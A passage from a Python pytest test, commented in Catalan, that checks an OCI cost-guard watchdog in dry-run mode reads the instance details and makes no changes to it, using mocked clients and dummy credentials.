            raise RuntimeError("CRÍTIC: update_instance no permès en dry-run!")

        def instance_action(self, *a, **kw):
            mutations.append(("instance_action", a, kw))
            raise RuntimeError("CRÍTIC: instance_action no permès en dry-run!")

    client = MockComputeClient()
    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: client
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    monkeypatch.setenv("OCI_TENANCY_OCID", "ocid1.tenancy.oc1..test_tenancy")
    monkeypatch.setenv("OCI_USER_OCID", "ocid1.user.oc1..test_user")
    monkeypatch.setenv("OCI_FINGERPRINT", "20:3b:97:13:55:1c:5b:0d:d3:37:d0:82:48:a9:a5:50")
    monkeypatch.setenv("OCI_PRIVATE_KEY", "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----")
    monkeypatch.setattr("scripts.oci_external_watchdog.get_oci_signer", lambda cfg: MagicMock())

    backend = InMemoryLockPersistenceBackend(initial_state={
        "locked": False,
        "sequence": 5,
        "hash": "c" * 64,
        "event_id": "ev-5-fast"
    })
    state_file = tmp_path / "cg_k7.json"
    guard = CostGuard(state_path=state_file, persistence_backend=backend)

    res = run_watchdog(
        mode="fast",
        dry_run=True,
        instance_ocid="ocid1.instance.oc1..prod_vm_fast",
        guard=guard
    )

    # 1. Verifica que s'ha consultat la instància OCI mitjançant get_instance
    assert len(get_instance_calls) == 1
    assert get_instance_calls[0] == "ocid1.instance.oc1..prod_vm_fast"

    # 2. Verifica les dades descobertes de la instància des de guard.state
    prov = guard.state.get("active_provisioning", {})
    assert prov.get("is_running") is True
    assert prov.get("shape") == "VM.Standard.A1.Flex"
    assert prov.get("ocpus") == 2.0
    assert prov.get("ram_gb") == 12.0
    assert prov.get("oci_anchor", {}).get("ledger_sequence") == 5
    assert prov.get("oci_anchor", {}).get("economic_lock") is False

    # 3. Cap mutació física executada
    assert len(mutations) == 0
    assert res["watchdog_ok"] is True
